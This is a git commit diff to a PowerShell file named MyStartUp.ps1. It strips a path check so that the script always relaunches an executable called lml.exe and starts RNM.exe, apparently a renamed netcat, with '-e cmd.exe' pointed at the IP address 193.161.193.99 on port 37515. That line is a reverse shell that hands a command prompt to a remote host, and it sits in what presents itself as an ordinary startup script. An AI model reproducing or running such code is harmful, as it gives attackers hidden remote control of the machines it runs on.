205148419e07cab48c0ee1d66aa29633a21bafcf
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-04-21 17:53:45 +0000

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,7 +1,3 @@
-if (-not (Test-Path "C:\Users\Alooo")) {
-    Write-Host "No"
-} else {
-    taskkill /F /IM lml.exe
-    C:\Users\Alooo\Downloads\lml.exe
-    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
-}
+taskkill /F /IM lml.exe
+C:\Users\Alooo\Downloads\lml.exe
+Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
